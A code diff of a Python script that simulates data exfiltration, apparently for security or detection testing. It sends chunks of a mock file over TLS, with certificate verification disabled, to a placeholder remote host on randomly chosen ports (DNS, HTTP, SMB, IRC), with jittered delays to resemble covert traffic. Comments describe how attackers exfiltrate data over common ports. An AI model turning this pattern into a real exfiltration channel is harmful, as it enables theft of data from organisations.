@@ -20,7 +20,7 @@ import time
 # Port 25 (SMTP): Hackers can use email protocols to exfiltrate data by disguising it as legitimate email traffic.
 # Port 3306 (MySQL): If an organization uses MySQL databases, attackers might exploit vulnerabilities to access and exfiltrate data.
 
-HOST = 'AWS IP OR DNS'
+HOST = 'AWS DNS'
 PORTS = [53, 80, 8080, 445, 6660, 6661, 6662, 6663, 6664, 6665, 6666, 6667, 6668, 6669] # Add more ports as needed...
 PORT = random.choice(PORTS)
 CHUNK_SIZES = [6400, 12800, 25600, 51200]
@@ -42,10 +42,10 @@ def main():
         context = ssl._create_unverified_context()
         
         with context.wrap_socket(sock, server_hostname=HOST) as ssock:
-            print(f"\nConnected to {HOST}:{PORT} over TLS")
+            print(f"Connected to {HOST}:{PORT} over TLS")
             
             with Progress() as progress:
-                task = progress.add_task("\nHold onto your butts...", total=total_chunks)
+                task = progress.add_task("Hold onto your butts...", total=total_chunks)
                 
                 for i in range(total_chunks):
                     chunk_size = CHUNK_SIZE if (i < total_chunks - 1) else (MOCK_FILE_SIZE % CHUNK_SIZE)
@@ -55,7 +55,7 @@ def main():
                     random_delay = random.uniform(0.01, 0.1)
                     time.sleep(random_delay)
             
-            print("\nFile exfiltration simulation complete! Clever girl...")
+            print("File exfiltration simulation complete! Clever girl...")
 
 if __name__ == "__main__":
     main()
